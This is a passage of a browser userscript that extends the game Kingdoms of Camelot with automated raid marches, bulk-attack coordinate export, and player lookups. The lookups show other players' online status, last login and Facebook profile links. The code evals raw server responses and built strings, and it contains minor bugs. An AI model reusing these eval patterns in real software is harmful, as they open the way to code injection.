		pop.getMainDiv().innerHTML = m;
		
		t.getKnights();
		
		document.getElementById ('pbHelp').addEventListener ('click', t.helpPop, false);
		document.getElementById ('pbRaidSave').addEventListener ('click', function(){
			var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
							
			params.pf = 0;
			params.ctrl = 'BotManager';
			params.action = 'saveMarch';
			params.settings = {};
			params.settings.cityId = cityId;
			params.queue = {0:{botMarches:{botMarchStatus:1,botState:1},cityMarches:{}}};    	
			params.queue[0].cityMarches.knightId = parseInt(document.getElementById ('RaidKnights').value);
			params.queue[0].cityMarches.toXCoord = X;
			params.queue[0].cityMarches.toYCoord = Y;
			params.queue[0].cityMarches.unit0Count = 0;
			params.queue[0].cityMarches.unit1Count = parseInt(document.getElementById ('Unit1').value);
			params.queue[0].cityMarches.unit2Count = parseInt(document.getElementById ('Unit2').value);
			params.queue[0].cityMarches.unit3Count = parseInt(document.getElementById ('Unit3').value);
			params.queue[0].cityMarches.unit4Count = parseInt(document.getElementById ('Unit4').value);
			params.queue[0].cityMarches.unit5Count = parseInt(document.getElementById ('Unit5').value);
			params.queue[0].cityMarches.unit6Count = parseInt(document.getElementById ('Unit6').value);
			params.queue[0].cityMarches.unit7Count = parseInt(document.getElementById ('Unit7').value);
			params.queue[0].cityMarches.unit8Count = parseInt(document.getElementById ('Unit8').value);
			params.queue[0].cityMarches.unit9Count = parseInt(document.getElementById ('Unit9').value);
			params.queue[0].cityMarches.unit10Count = parseInt(document.getElementById ('Unit10').value);
			params.queue[0].cityMarches.unit11Count = parseInt(document.getElementById ('Unit11').value);
			params.queue[0].cityMarches.unit12Count = parseInt(document.getElementById ('Unit12').value);
			
			 new AjaxRequest2(unsafeWindow.g_ajaxpath + "ajax/_dispatch.php" + unsafeWindow.g_ajaxsuffix, {
						method: "post",
						 parameters: params,
						 loading: true,
						 onSuccess: function(transport){
							var rslt = eval("(" + transport.responseText + ")");
							  if (rslt.ok) {
									pop.show (false);
									unsafeWindow.cityinfo_army();
								  setTimeout(unsafeWindow.update_seed_ajax, 250);
							 } else ('Error :' + rslt.msg);
							 
						 },
				 });
			}, false);
		
		pop.show (true);
	  },
	   /* Export found wild coords to crest search tab */
	  ExportToCrestSearch : function (Slot,X,Y)
	  {
		//Put X,Y to crest search tab
		if (Slot == 1)
		{
			document.getElementById('pbcrestx').value = X;
			document.getElementById('pbcresty').value = Y;
		}
		else if (Slot == 2)
		{
			document.getElementById('pbcrestx1').value = X;
			document.getElementById('pbcresty1').value = Y;
		}
		//Save options
		CrestOptions.X = document.getElementById('pbcrestx').value; 
		CrestOptions.Y = document.getElementById('pbcresty').value; 
		CrestOptions.CX = document.getElementById('pbcrestx1').value; 
		CrestOptions.CY = document.getElementById('pbcresty1').value; 
		saveCrestOptions();
	  },
	  
	  getKnights : function(){
			 var t = Tabs.Search;
			 var knt = new Array();
			 cityId = t.selectedCity['id'];
			 for (k in Seed.knights['city' + cityId]){
					if (Seed.knights['city' + cityId][k]["knightStatus"] == 1 && Seed.leaders['city' + cityId]["resourcefulnessKnightId"] != Seed.knights['city' + cityId][k]["knightId"] && Seed.leaders['city' + cityId]["politicsKnightId"] != Seed.knights['city' + cityId][k]["knightId"] && Seed.leaders['city' + cityId]["combatKnightId"] != Seed.knights['city' + cityId][k]["knightId"] && Seed.leaders['city' + cityId]["intelligenceKnightId"] != Seed.knights['city' + cityId][k]["knightId"]){
						knt.push ({
							Name:   Seed.knights['city' + cityId][k]["knightName"],
							Combat:	parseInt(Seed.knights['city' + cityId][k]["combat"]),
							ID:		Seed.knights['city' + cityId][k]["knightId"],
						});
					}
			 }
			 knt = knt.sort(function sort(a,b) {a = a['Combat'];b = b['Combat'];return a == b ? 0 : (a > b ? -1 : 1);});
			 document.getElementById('RaidKnights').options.length=0;
			var o = document.createElement("option");
			o.text = '-- '+culang.select+' --';
			o.value = 0;
			document.getElementById("RaidKnights").options.add(o);
			 for (k in knt){
					if (knt[k]["Name"] !=undefined){
						var o = document.createElement("option");
						o.text = (knt[k]["Name"] + ' (' + knt[k]["Combat"] +')')
						o.value = knt[k]["ID"];
						document.getElementById("RaidKnights").options.add(o);
					}
			}
		  },
 
	  gotPlayerLeaderboard : function (rslt, span){
		var t = Tabs.Search;
		if (!rslt.ok){
		  span.innerHTML = rslt.errorMsg;
		  return;
		}
		if (rslt.totalResults == 0){
		  span.innerHTML = ''+culang.leaderboardmist+'<BR><BR>';
		  return;
		}
		var p = rslt.results[0];
		var x;
		var name = '';
		if (p.playerSex == 'M')
		  name = 'Lord ';
		else if (p.playerSex == 'F')
		  name = 'Lady ';   
		name += p.displayName;      
		if ((x = officerId2String(p.officerType)) != '')  
		  name += ' ('+ x + ')';  
		var aName = p.allianceName;
		if (!aName || aName=='')
		  aName = 'none';
	var m = '<CENTER><SPAN class=boldRed><u>'+culang.impnote+'</u>: '+culang.leaderdataimpNote+'</span></center><TABLE class=pdxTabSome>';
	m += '<TR><TD class=pbDetLeft>'+culang.player+':</td><TD>'+ name +'</td></tr>\
	  <TR><TD class=pbDetLeft>'+culang.might+':</td><TD>'+ p.might +' ('+culang.rank+' #'+ p.rank +')</td></tr>\
	  <TR><TD class=pbDetLeft>'+culang.alliance+':</td><TD>'+ aName +' ('+ getDiplomacy(p.allianceId) +')</td></tr>\
	  <TR valign=top><TD class=pbDetLeft>'+culang.cities+':</td><TD><TABLE class=pdxTabSome><TR style="font-weight:bold"><TD>'+culang.city+'</td><TD>'+culang.coord+'</td><TD>'+culang.level+'</td><TD>'+culang.status+'</td><TD>'+culang.create+'</td></tr>';
	  
		for (var i=0; i<p.cities.length; i++){
		  var c = p.cities[i];
		  var created = '';
		  if (c.dateCreated && c.dateCreated.substr(0,2)=='20')
			created = c.dateCreated.substr(0,10);
		  m += '<TR><TD>'+ c.cityName +'</td><TD>'+ pdxkoordlink(c.xCoord, c.yCoord) +'</td><TD align=center>'+ c.tileLevel +'</td>\
			  <TD>'+ cityStatusString (c.cityStatus) +'</td><TD>'+ created +'</td></tr>';
		}    
		m += '</table></td></tr></table>';
		span.innerHTML = m;
	  },

	  gotPlayerInfo : function (rslt, span){
		var t = Tabs.Search;
		if (!rslt.ok){
		  span.innerHTML = rslt.errorMsg;
		  return;
		}
		var m = '<TABLE class=pdxTabSome>';
		var p = rslt.userInfo[0];
		var pids = p.provinceIds.split (',');
		var prov = [];
		for (var i=0; i<pids.length; i++)
		  prov.push(unsafeWindow.provincenames['p'+pids[i]]);
		m += '<TR><TD class=pbDetLeft>'+culang.player+':</td><TD>'+ p.genderAndName +'</td></tr>\
	  <TR>	  <TD class=pbDetLeft>'+culang.might+':</td><TD>'+ p.might +'</td>	  </tr>\
	  <TR>	  <TD class=pbDetLeft>'+culang.STfbprofile+':</td> <TD><A target="_tab" href="http://www.facebook.com/profile.php?id='+ p.fbuid +'">'+culang.show+'</a> </td>	  </tr>\
	  <TR><TD class=pbDetLeft>'+culang.alliance+':</td><TD>'+ p.allianceName +' ('+ getDiplomacy(p.allianceId) +')</td></tr>\
	  <TR valign=top><TD class=pbDetLeft>'+culang.STprov+':</td><TD style="white-space:normal">'+ prov.join(', ') +'</td></tr>';
	span.innerHTML = m + '</table>';
	  },
		  
	  fetchPlayerInfo : function (uid, notify){
		var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
		params.uid = uid;
		new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/getUserGeneralInfo.php" + unsafeWindow.g_ajaxsuffix, {
		  method: "post",
		  parameters: params,
		  onSuccess: function (rslt) {
			notify (rslt);
		  },
		  onSuccess: function (rslt) {
			notify (rslt);
		  },
		});
	  },
	  fetchLeaderboard : function (uid, notify) {
		var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
		params.userId = uid;
		new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/getUserLeaderboard.php" + unsafeWindow.g_ajaxsuffix, {
		  method: "post",
		  parameters: params,
		  onSuccess: function (rslt) {
			notify (rslt);
		  },
		  onFailure: function (rslt) {
			notify (rslt);
		  },
		});
	  },
	  fetchPlayerStatus : function (uidArray, notify){
		var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
		params.checkArr = uidArray.join(',');
		new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/getOnline.php" + unsafeWindow.g_ajaxsuffix, {
		  method: "post",
		  parameters: params,
		  onSuccess: function (rslt) {
			notify (rslt);
		  },
		  onFailure: function (rslt) {
			notify ({errorMsg:'AJAX error'});
		  },
		});
	  },
	  
	};   // end Search tab

/******** Export to KOC Attack **********/  
	var exportToKOCattack = {
	  troops : {},  
	  
	  init : function (){
		var t = exportToKOCattack;
		for (var b=1; b<11; b++){
		  t.troops['b'+ b] = [];
		  for (var trp=0; trp<12; trp++){
			t.troops['b'+ b][trp] = 0;
		  }
		}
		var s = GM_getValue ('atkTroops_'+ getServerId(), null);
		if (s != null){
		  var trp = JSON2.parse(s);
		  for (var b=1; b<11; b++){
			if (trp['b'+ b] && trp['b'+ b].length == 12)
			  t.troops['b'+ b] = trp['b'+ b];
		  }
		}
		window.addEventListener('unload', t.onUnload, false);
	  },
	  
	  onUnload : function (){
		var t = exportToKOCattack;
		if (!ResetAll) GM_setValue ('atkTroops_'+ getServerId(),  JSON2.stringify(t.troops));
	  },
	  
	  doExport : function (coordList, city){
		var t = exportToKOCattack;
		var popExp = null;
		var cList = coordList;
		var curLevel = 0;
		var city = city;
		var troopDef = [    [''+culang.shrsupply+'', 1],    [''+culang.shrsupplywagon+'', 9],    [''+culang.shrtarcher+'', 6],    [''+culang.shrcavalry+'', 7],    [''+culang.shrheavycavalry+'', 8],    [''+culang.shrballista+'', 10],  ];
		
		if (popExp == null){
		  popExp = new CPopup ('pbsrcexp', 0,0, 746, 100, true, function (){popExp.destroy(); popExp=null;});
		  popExp.centerMe (mainPop.getMainDiv());  
		}
		var m = '<DIV class=pdxStat>'+culang.exportkocattack+'</div><BR><TABLE align=center cellpadding=0 cellspacing=0 class=pdxTabPadNW>    <TR style="font-weight:bold;"><TD>'+culang.target+' '+culang.type+'</td><TD style="padding:1px" align=center>#<BR>'+culang.targets+'</td><TD width=15></td>';
		for (var i=0; i<troopDef.length; i++)
		  m += '<TD>'+ troopDef[i][0] +'</td>';
		m += '</tr>';
		for (var b=1; b<11; b++){
		  m += '<TR><TD>'+culang.barbarians+' '+ b +'</td><TD align=right>'+ coordList['lvl'+b].length  +'&nbsp; &nbsp;</td><TD></td>';
		  for (var td=0; td<troopDef.length; td++)
			m += '<TD><INPUT id=ptET_'+ b +'_'+ troopDef[td][1] +' type=text size=3 value="'+ t.troops['b'+ b][troopDef[td][1]-1] +'"></td>';
		  m += '<TD width=90%><SPAN class=boldRed id=ptETerr_'+ b +'></span></tr>';
		}
		m += '</table>';
		var isKOCattack = !(document.getElementById('KOCAttackToggle') == null);
	
		if (isKOCattack){
		  m += '<BR><CENTER>'+ strButton20(''+culang.addkoordtokocattack+'', 'id=pbSrcDoBA') +'</center>';
		} else {
		  m += ''+culang.notactiv+''; 
		}
		m += '<CENTER><DIV style="width:70%" id=pbSrcExpResult></DIV></center>';
		popExp.getMainDiv().innerHTML =  m;
		for (var b=1; b<11; b++)
		  for (var td=0; td<troopDef.length; td++)
			document.getElementById('ptET_'+ b +'_'+ troopDef[td][1]).addEventListener ('change', validate, false);
		
		popExp.getTopDiv().innerHTML = '<div class=showBadged><CENTER><B>'+culang.exporthelp+'</b></center></div>';
		if (isKOCattack)    
		  document.getElementById ('pbSrcDoBA').addEventListener ('click', doBulkAdd, false);
		popExp.show(true);
			 
		if (city != null){
		  for (var i=0; i<Cities.numCities; i++)
			if (city.id == Cities.cities[i].id)
			  break;
		  if (i < Cities.numCities){
			setTimeout (function(){unsafeWindow.citysel_click(document.getElementById('citysel_'+ (i+1)));}, 0);        
		  }
		}  
		function validate (e){
		  var x = e.target.id.substr(5).split('_');
		  var b = x[0];
		  var trp = x[1];
		  document.getElementById('ptETerr_'+ b).innerHTML = '';
		  var x = parseIntZero (e.target.value);
		  if (isNaN(x) || x<0 || x>150000){
			e.target.style.backgroundColor = 'red';
			document.getElementById('ptETerr_'+ b).innerHTML = ''+culang.errentry+'';
			return;
		  } else {
			e.target.style.backgroundColor = '';
			e.target.value = x;
			t.troops['b'+ b][trp-1] = x;
		  }
		  var tot = 0;
		  for (var td=0; td<troopDef.length; td++)
			tot += parseIntZero(document.getElementById('ptET_'+ b +'_'+ [troopDef[td][1]]).value);
		  if (tot<1 && cList['lvl'+ b].length>0 )
			document.getElementById('ptETerr_'+ b).innerHTML = ''+culang.errnotrp+'';
		  if (tot>150000)
			document.getElementById('ptETerr_'+ b).innerHTML = ''+culang.errtomuchtrp+'';
		}	  
		function doBulkAdd (){
		  for (var b=1; b<11; b++){
			if (document.getElementById('ptETerr_'+ b).innerHTML != '')
			  return;
			var tot = 0;
			for (var td=0; td<troopDef.length; td++)
			  tot += t.troops['b'+b][troopDef[td][1]-1];
			if (tot<1 && cList['lvl'+ b].length>0){
			  document.getElementById('ptETerr_'+ b).innerHTML = ''+culang.errnotrp+'';
			  return;
			} else if (tot>150000) {
			  document.getElementById('ptETerr_'+ b).innerHTML = ''+culang.errtomuchtrp+'';
			  return;
			}
		  }    
		  document.getElementById('pbSrcExpResult').innerHTML = '';
		  doNextLevel ();
		}
		function endBulkAdd (msg){
		  unsafeWindow.Modal.hideModalAll();
		  curLevel = 0;
		  showMe ();
		  popExp.show(true);
		  document.getElementById('pbSrcExpResult').innerHTML += msg;
		}
		function doNextLevel (){
		  while ( curLevel<10 && cList['lvl'+ ++curLevel].length==0)
			;
		  if (curLevel>=10){
			endBulkAdd (''+culang.done+'!<BR>');
			return;
		  }
		 e_attackDialog(false);
		}	
		function e_attackDialog (tf){
		  if (!tf){
		   hideMe();
		   popExp.show (false);
		   unsafeWindow.Modal.hideModalAll();
		   unsafeWindow.modal_attack(4,0,0);
		   new CwaitForElement ('BulkAddAttackDiv', 1000, e_attackDialog );
		  }
		  var div = searchDOM (document.getElementById('BulkAddAttackDiv'), 'node.tagName=="DIV" && node.style.display=="none"', 10);
		  if (div==null){
			endBulkAdd ('<SPAN class=boldRed>'+culang.Herror+': '+culang.errorformart+' (1).</span>');
			return;  
		  }
		  var ta = searchDOM (div, 'node.tagName=="TEXTAREA"', 10);
		  var but = searchDOM (div, 'node.tagName=="A"', 10);
		  if (ta==null || but==null){
			endBulkAdd ('<SPAN class=boldRed>'+culang.Herror+': '+culang.errorformart+' (2).</span>');
			return;  
		  }
		  for (var trp=1; trp<13; trp++){
			var inp = document.getElementById('modal_attack_unit_ipt' +trp);
			inp.value = t.troops['b'+curLevel][trp-1];
			if (t.troops['b'+curLevel][trp-1] > 0)
			  inp.style.backgroundColor = 'yellow';
			else
			  inp.style.backgroundColor = 'white';
		  }
		  div.style.display = 'block';
		  document.getElementById('KOCAttackBulkAddForce').checked = true;
		  if (DISABLE_BULKADD_LIST)
			ta.value = '';
		  else {
			var m = '';
			var list = cList['lvl'+ (curLevel)];
			for (i=0; i<list.length; i++)
			  m += list[i].x +','+ list[i].y +'\n';
			ta.value = m;
		  }
		  clickWin (unsafeWindow, but, 'click');   
		  unsafeWindow.Modal.hideModal();
		  document.getElementById('pbSrcExpResult').innerHTML += ' '+ list.length +' '+culang.coordadded+' '+ city.name +' '+culang.coordadded2+'<BR>';
		  setTimeout (doNextLevel, 500);
		}    
	  },
	}
	  function searchDOM (node, condition, maxLevel, doMult){
		var found = [];
		eval ('var compFunc = function (node) { return ('+ condition +') }');
		doOne(node, 1);
		if(!doMult){
		  if (found.length==0)
			return null;
		  return found[0];
		}
		return found;
		function doOne (node, curLevel){
		  try {
			if (compFunc(node))
			  found.push(node);
		  } catch (e){
		  }      
		  if (!doMult && found.length>0)
			return;
		  if (++curLevel<maxLevel && node.childNodes!=undefined)
			for (var c=0; c<node.childNodes.length; c++)
			  doOne (node.childNodes[c], curLevel);
		}
	  }

/***********************************************************************************/
/************ KOC POWER - TABS PLAYER *********************************************/
/*********************************************************************************/
Tabs.AllianceList = {
  tabLabel : culang.player,
  tabOrder : StyleOptions.toSpieler,
  cont : null,
  nombre: null,
  state : null,
  dat : [],
  
   init : function (div){
	var t = Tabs.AllianceList;
	t.cont = div;
	unsafeWindow.pdxGetMembers = t.eventGetMembers;
	unsafeWindow.PTPaintMembers = t.GetDataForMap;
	unsafeWindow.pdxGetMember = t.eventGetLienMember;
	unsafeWindow.pdxPlyDetail = t.clickedPlayerDetail;
	unsafeWindow.pdxPlyLeader = t.clickedPlayerLeaderboard;
	unsafeWindow.pdxPlyLeader2 = t.clickedPlayerLeaderboard2;
	unsafeWindow.pdxPlyLogin = t.clickedPlayerGetLastLogin;
	unsafeWindow.pdxPrevClick = t.eventListPrev;
	unsafeWindow.pdxNextClick = t.eventListNext;
	t.nombre=0;
  },

 hide : function (){
    var t = Tabs.AllianceList;
    mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
  },

  show : function (){
    var t = Tabs.AllianceList;
    if (t.state == null){
    
    mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
	
      if (getMyAlliance()[0] == 0) {
        t.cont.innerHTML = '<BR><BR><CENTER><blink><b>'+culang.uneedally+'</b></blink></center>';
        t.state = 1;
        return;
      }
	  
      var m = '<DIV class=pdxStat>'+culang.HallPlayerS+'</div><DIV class=pdxEntry><TABLE width=100% cellpadding=0>\
		<TR><TD class=xtab align=right></td><TD class=xtab>'+culang.player+' '+culang.name+': &nbsp;</td>\
		<TD width=80% class=xtab><INPUT id=allPlayName size=20 type=text/> &nbsp; <INPUT id=playSubmit type=submit value="'+culang.player+' '+culang.search+'" /></td>\
		<TD class="xtab ptErrText"><SPAN id=ptplayErr></span></td></tr><TR><TD class=xtab> </td><TD class=xtab>'+culang.alliance+' '+culang.name+': &nbsp;</td>\
		<TD class=xtab><INPUT id=allAllName type=text /> &nbsp; <INPUT id=allSubmit type=submit value="'+culang.alliance+' '+culang.search+'" /></td>\
		<TD class="xtab ptErrText"><SPAN id=ptallErr></span></td></tr><TR><TD class=xtab> </td><TD class=xtab> &nbsp;<INPUT align=left id=allListSubmit type=submit value="'+culang.leaderboard+'" /></td>\
		<TD class=xtab><INPUT align=right id=allGotoPage type=submit value="'+culang.page+'" /><INPUT align=right id=idPageNum type="text" value='+t.curPage+' size=4 /><INPUT align=left id="idMyAllSubmit" type=submit value="'+ getMyAlliance()[1] +'"/>\
		<INPUT align=left id="idMyTHSubmit" type=submit value="'+culang.PTtop100+'"/> <TD class=xtab><b>'+culang.yourUserID+'</b>: <a href="http://koc.dunno.com/index.sjs?f=ServersByUser&user_id='+parseInt([Seed.tutorial.userId])+'" target="_blank" >'+parseInt([Seed.tutorial.userId])+'</a></td><TD class=xtab > <span><b><center>'+culang.PTarive+'</center></b></span></td></tr>\
		<TR><TD height="43" class=xtab> </td><TD colspan="3" class=xtab><SPAN class=boldRed><u>'+culang.impo+'</u></span>: '+culang.PTimpnote+'<br><u><b>'+culang.impnote+'</b></u>: '+culang.PTimpnote2+'<br><b>'+culang.eta+'</b>: '+culang.PTEtanote+'</td>\
		<TD class=xtab ><div><center><select id="idFindETASelect"><option value="0,250" >-- '+culang.select+' --</option><option value="0,180" >'+culang.supplytroop+'</option><option value="0,200" >'+culang.militiaman+'</option><option value="0,3000" >'+culang.scout+'</option><option value="0,300" >'+culang.pikeman+'</option><option value="0,275" >'+culang.swordsman+'</option><option value="0,250" >'+culang.archer+'</option><option value="1,1000" >'+culang.cavalry+'</option><option value="1,750" >'+culang.heavycavalry+'</option><option value="1,150" >'+culang.supplywagon+'</option><option value="1,100" >'+culang.ballista+'</option><option value="1,120" >'+culang.batteringram+'</option><option value="1,80" >'+culang.catapult+'</option></select></div>\
		</td></tr></table><span style="vertical-align:middle;" id=altInput></span></div><SPAN id=allListOut></span>';
      t.cont.innerHTML = m;
      
      document.getElementById('allSubmit').addEventListener ('click', t.eventSubmit, false);
      document.getElementById('playSubmit').addEventListener ('click', t.eventPlayerSubmit, false);
      document.getElementById('allAllName').addEventListener ('focus', function (){document.getElementById('ptallErr').innerHTML='';}, false);
      document.getElementById('idMyTHSubmit').addEventListener ('click', t.eventListTHSubmit, false);
      document.getElementById('allPlayName').addEventListener ('focus', function (){document.getElementById('ptplayErr').innerHTML='';}, false);
      document.getElementById('allListSubmit').addEventListener ('click', t.eventListSubmit, false);
      document.getElementById('allGotoPage').addEventListener ('click', t.gotoPage, false);
      document.getElementById('idMyAllSubmit').addEventListener ('click', t.showMyAlliance, false);
      document.getElementById('allGotoPage').disabled = true;
      document.getElementById('idFindETASelect').addEventListener ('click', t.handleEtaSelect, false);
      document.getElementById('idFindETASelect').disabled = true;
        
      t.ModelCity=Cities.cities[0];
      t.curPage = 0;
      t.MaxPage = -1;
      t.state = 1;
    }
  },

  pName : '',
  eventPlayerSubmit : function (){
    var t = Tabs.AllianceList;
    document.getElementById('ptplayErr').innerHTML='';
    var name = document.getElementById('allPlayName').value;
     name = name.replace(/\'/g,"_");
    t.pName = name;
    if (name.length < 3){
      document.getElementById('ptplayErr').innerHTML = unsafeWindow.g_js_strings.getAllianceSearchResults.entryatleast3;
      return;
    }
    document.getElementById('altInput').innerHTML = '';
     document.getElementById('allListOut').innerHTML = '<BR><BR><CENTER>'+unsafeWindow.g_js_strings.commonstr.loadingddd+'</center>';
    t.fetchPlayerList (name, t.eventGotPlayerList);
  },
  eventGetLienMember: function(name) {
    var t = Tabs.AllianceList;
    document.getElementById('allPlayName').value = name;
    t.eventPlayerSubmit();   
  }, 
  eventGotPlayerList : function (rslt){
    var t = Tabs.AllianceList;
    if (!rslt.ok){
      document.getElementById('allListOut').innerHTML = rslt.errorMsg;
      return;
    }
    t.playerList = rslt.matchedUsers;
        var uList = [];
        for (k in rslt.matchedUsers)
          uList.push (rslt.matchedUsers[k].userId);     
          t.fetchPlayerStatus (uList, function(r) {t.eventGotPlayerOnlineList(r)});    
      },    
        
      eventGotPlayerOnlineList : function (rslt){
        var t = Tabs.AllianceList;
        if (!rslt.ok){
          document.getElementById('allListOut').innerHTML = rslt.errorMsg;
          return;
    }
    var m = '<DIV class=pdxStat>'+culang.searchWord+': <B>"'+ t.pName +'"</b></div>\
      <DIV style="height:575px; max-height:575px; overflow-y:auto">\
      <TABLE width=95% align=center class=pdxTab cellspacing=0><TR style="font-weight:bold"><TD width=20%>'+culang.name+'</td>\
      <TD align=right>'+culang.might+' &nbsp;&nbsp;&nbsp;&nbsp;</td><TD> &nbsp; '+culang.online+'</td><TD width=60%>'+culang.player+' '+culang.info+'</td></tr>';
    var row=0;
    var cl='';
    for (k in t.playerList){
      var u = t.playerList[k];
      if (++row % 2)
        cl = 'class=ptOddrow ';
      else
        cl = '';
        if (u.allianceName) { var alliancenammme=u.allianceName; }else {var alliancenammme="---"; }
      m += '<TR '+ cl +'valign=top><TD><A target="_tab" href="http://koc.dunno.com/index.sjs?f=ServersByUser&user_id='+ u.userId +'">'+ u.genderAndName +'</a> <BR>'+culang.userID+': '+ u.userId +'<br>'+alliancenammme+'<br><A target="_tab" href="http://www.facebook.com/profile.php?id='+ u.fbuid +'">'+culang.profile+'</a></td><TD align=center>&nbsp;'+ addCommasInt(u.might) +'&nbsp;</td>\
          <TD>'+ (rslt.data[u.userId]?"&nbsp;<SPAN class=boldGreen>"+culang.online+"</span>":"") +'</td>\
         <TD><SPAN onclick="pdxPlyDetail(this, '+ u.userId +')"><A title="'+culang.showDetails+'">'+culang.details+'</a> &nbsp; <BR></span><span onclick="pdxPlyLeader2(this,'+ u.userId+','+rslt.data[u.userId]+')"><A>'+culang.show+'</a></span>&nbsp;<br><SPAN onclick="pdxPlyLogin(this, \''+ u.userId +'\')"><A>'+culang.lastlogin+'</a></span></td></tr>';
    }
    m += '</table></div>';
    document.getElementById('allListOut').innerHTML = m;
  },
  
  clickedPlayerDetail : function (span, uid){
    var t = Tabs.AllianceList;
    span.onclick = '';
    span.innerHTML = ""+culang.srcplydata+"";
    t.fetchPlayerInfo (uid, function (r) {t.gotPlayerDetail(r, span)});
  },

  clickedPlayerLeaderboard : function (span, uid){
    var t = Tabs.AllianceList;
    span.onclick = '';
    span.innerHTML = ""+culang.srcleaddata+"";
    t.fetchLeaderboard (uid, function (r) {t.gotPlayerLeaderboard(r, span)});
  },
  clickedPlayerLeaderboard2 : function (span, uid,status){
      var t = Tabs.AllianceList;
    span.onclick = '';
    span.innerHTML = ""+culang.srcleaddata+"";
    t.fetchLeaderboard (uid, function (r) {t.gotPlayerLeaderboard2(r, span,uid,status)});
  },
  
   clickedPlayerGetLastLogin : function (span, uid){
      var t = Tabs.AllianceList;
      span.onclick = '';
      span.innerHTML = ""+culang.searchlogindata+"";
      t.fetchPlayerLastLogin (uid, function (r) {t.gotPlayerLastLogin(r, span)});
    },
   gotPlayerLeaderboard2 : function (rslt,span,uid,status){
     // alert(uid+'/'+status);
        var t = Tabs.AllianceList;
      if (!rslt.ok){
        span.innerHTML = rslt.errorMsg;
        return;
      }
      if (rslt.totalResults == 0){
        span.innerHTML = ''+culang.leaderboardmist+'';
        return;
      }
      var myA = getMyAlliance ();
      t.dat = [];
      var p = rslt.results[0];
          if ( myA[0] == p.allianceId)
             t.friendEta = true;
          else
             t.friendEta = false;
          for (var c=0; c<p.cities.length; c++){
                   t.dat.push ([p.displayName, parseInt(p.might), p.officerType, parseInt(p.numCities), parseInt(p.cities[c].tileLevel),
		                parseInt(p.cities[c].xCoord), parseInt(p.cities[c].yCoord), p.cities[c].cityName, 0, c, p.userId, p.avatarId, p.playerSex, p.rank, status, 'NA']);
         
          }
          t.setDistances (Cities.cities[0].x, Cities.cities[0].y);
          t.ModelCity=Cities.cities[0];
          t.setEta();
          t.fetchPlayerLastLogin (uid, function (r) {t.displayPlayer(p.allianceName,r)});
          //t.fetchPlayerLastLogin();
          //t.displayPlayer (p.allianceId);
  },
  gotPlayerLeaderboard : function (rslt, span){
    var t = Tabs.AllianceList;
    if (!rslt.ok){
      span.innerHTML = rslt.errorMsg;
      return;
    }
    if (rslt.totalResults == 0){
      span.innerHTML = ''+culang.leaderboardmist+'';
      return;
    }
    var p = rslt.results[0];
    var an = p.allianceName;
    if (!an || an=='' || p.officerType==4)
      an = 'Niemand';
    else
      an += ' ('+ officerId2String(p.officerType) +')';
    m = '<TABLE cellspacing=0 class=pdxTab><TR><TD><B>'+culang.leaderboard+': </b></td><TD colspan=2> '+culang.might+': '+ p.might  +' &nbsp; '+culang.alliance+': '+ an +'</td></tr>'; 
    for (var i=0; i<p.cities.length; i++){
      var c = p.cities[i];
      var created = '';
      if (c.dateCreated && c.dateCreated.substr(0,2)=='20')
        created = ' &nbsp; &nbsp; '+culang.create+': ' + c.dateCreated.substr(0,10);
      m += '<TR><TD align=right><B>'+culang.city+' #'+ (i+1) +':</b></td><TD> &nbsp; '+ c.cityName 
        + '&nbsp;'+pdxkoordlink(c.xCoord,c.yCoord)+' '
        + '</td><TD width=75%> &nbsp; '+culang.level+': '
        + c.tileLevel +' &nbsp; &nbsp; '+culang.status+': '+ cityStatusString (c.cityStatus) + created +'</td></tr>';
    }  
    span.innerHTML = m + '</table>';
  },
 displayPlayer : function (allName,rslt){
   var t = Tabs.AllianceList;
    function alClickSort (e){
      var t = Tabs.AllianceList;
      var newColNum = e.id.substr(8);
      document.getElementById('clickCol'+t.sortColNum).className = 'clickable';
      e.className='clickable clickableSel';
      if (newColNum == t.sortColNum)
        t.sortDir *= -1;
      else
        t.sortColNum = newColNum;
      t.reDisp();
    }
    unsafeWindow.PTalClickSort = alClickSort;
    var m = '<STYLE>.clickable{background-color:#ddd; border:2px outset; border-color:#555; padding-left:5px; padding-right:5px}\
	.clickableSel{background-color:#ffffcc;}\
	.xxtab{background-color:none; padding-left:5px; padding-right:5px;} </style>\
	<DIV class=pdxStat ><TABLE id=tabAllMembers cellpadding=0  width=100%><TR font-weight:bold"><TD class=xtab>'+culang.alliance+': '+ allName +'</td>\
	<TD class=xtab width=80% align=center>'+culang.lastlogin+': <SPAN id=lastlogin>'+  rslt.playerInfo.lastLogin+'</span></td><TD class=xtab align=right></td></tr></table></div>\
	<div style="max-height:670px; height:570px; overflow-y:auto;"><TABLE id=tabAllMembers align=center cellpadding=0 cellspacing=0><THEAD style="overflow-y:hidden;">\
	<TR style="font-weight:bold"><TD id=clickCol0 onclick="PTalClickSort(this)" class=clickable><A><DIV>'+culang.player+'</div></a></td>\
	<TD id=clickCol1 onclick="PTalClickSort(this)" class=clickable align=center><A><DIV>'+culang.might+'</a></div></td>\
	<TD id=clickCol3 onclick="PTalClickSort(this)" class=clickable><A><DIV>'+culang.cities+'</a></div></td>\
	<TD id=clickCol2 onclick="PTalClickSort(this)" class=clickable align=center><A><DIV>'+culang.rank+'</a></div></td>\
	<TD id=clickCol9 onclick="PTalClickSort(this)" class=clickable align=center><A><DIV>'+culang.online+'</a></div></td>\
	<TD id=clickCol7 onclick="PTalClickSort(this)" class=clickable><A><DIV>'+culang.city+'</a></div></td>\
	<TD id=clickCol4 onclick="PTalClickSort(this)" class=clickable><A><DIV>'+culang.stlev+'</a></div></td>\
	<TD id=clickCol5 onclick="PTalClickSort(this)" class=clickable><A><DIV>'+culang.shrcoord+'</a></div></td>\
	<TD id=clickCol8 onclick="PTalClickSort(this)" class=clickable><A><DIV>'+culang.shrdist+'</a></div></td>\
	<TD id=clickCol10 onclick="PTalClickSort(this)" class=clickable><A><DIV>'+culang.eta+'</a></div></td>\
	<TD class=clickable><A><DIV>'+culang.lastlogin+'</a></div></td></tr></thead>\
